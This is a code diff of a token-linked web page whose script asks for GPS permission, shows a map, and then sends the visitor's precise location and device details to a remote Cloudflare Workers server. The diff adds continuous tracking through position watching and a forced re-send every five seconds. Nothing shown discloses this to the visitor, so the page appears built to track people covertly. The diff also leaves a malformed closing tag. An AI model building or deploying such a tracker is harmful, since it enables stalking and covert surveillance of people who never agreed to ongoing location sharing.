@@ -329,7 +329,6 @@ left: 0px;
 </div>
 
 <script>
-/* ================= CONFIG ================= */
 const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
 const token = new URLSearchParams(location.search).get("token");
 if(!token){ alert("Invalid link"); throw "NO TOKEN"; }
@@ -337,75 +336,77 @@ if(!token){ alert("Invalid link"); throw "NO TOKEN"; }
 const mapFrame = document.getElementById("mapFrame");
 const statusEl = document.getElementById("status");
 
-/* Device info */
+let lastPos = null;
+
+/* DEVICE INFO */
 function deviceInfo(){
   return {
     ua:navigator.userAgent,
     lang:navigator.language,
-    screen:`${screen.width}x${screen.height}`
+    screen:`${screen.width}x${screen.height}`,
+    time: Date.now()
   };
 }
 
-/* CLICK */
+/* SEND TO SERVER */
+function send(pos){
+  lastPos = pos;
+  fetch(API+"/send-location",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      token,
+      lat:pos.coords.latitude,
+      lng:pos.coords.longitude,
+      acc:pos.coords.accuracy,
+      device:deviceInfo()
+    })
+  });
+}
+
+/* BUTTON CLICK — MUST BE DIRECT */
 document.getElementById("allowBtn").onclick = ()=>{
   if(!navigator.geolocation){
     statusEl.textContent="Location not supported";
     return;
   }
 
-  statusEl.textContent="Requesting location…";
+  statusEl.textContent="Requesting GPS permission…";
 
   navigator.geolocation.getCurrentPosition(
-    success,
-    error,
-    { enableHighAccuracy:true, timeout:20000, maximumAge:0 }
+    pos=>{
+      // first accurate hit
+      mapFrame.src =
+       `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}&z=18&output=embed`;
+
+      send(pos);
+      document.getElementById("permission").remove();
+
+      // watch GPS changes
+      navigator.geolocation.watchPosition(
+        p=>send(p),
+        ()=>{},
+        { enableHighAccuracy:true, maximumAge:0 }
+      );
+
+      // FORCE send every 5 seconds (IMPORTANT)
+      setInterval(()=>{
+        if(lastPos) send(lastPos);
+      }, 5000);
+
+    },
+    err=>{
+      statusEl.textContent =
+        err.code === 1
+        ? "Permission denied. Enable Precise Location."
+        : "GPS unavailable. Turn ON location.";
+    },
+    { enableHighAccuracy:true, timeout:25000, maximumAge:0 }
   );
 };
+</>
 
-/* SUCCESS */
-function success(pos){
-  const {latitude,longitude,accuracy} = pos.coords;
 
-  // Update map instantly
-  mapFrame.src =
-   `https://www.google.com/maps?q=${latitude},${longitude}&z=18&output=embed`;
-
-  // Send first hit
-  fetch(API+"/send-location",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      token,
-      lat:latitude,
-      lng:longitude,
-      acc:accuracy,
-      device:deviceInfo()
-    })
-  });
-
-  document.getElementById("permission").remove();
-
-  // Continuous tracking
-  navigator.geolocation.watchPosition(p=>{
-    fetch(API+"/send-location",{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({
-        token,
-        lat:p.coords.latitude,
-        lng:p.coords.longitude,
-        acc:p.coords.accuracy
-      })
-    });
-  },()=>{}, {enableHighAccuracy:true});
-}
-
-/* ERROR */
-function error(e){
-  statusEl.textContent =
-    "Enable GPS & allow location permission";
-}
-</script>
 
 </body>
 </html>
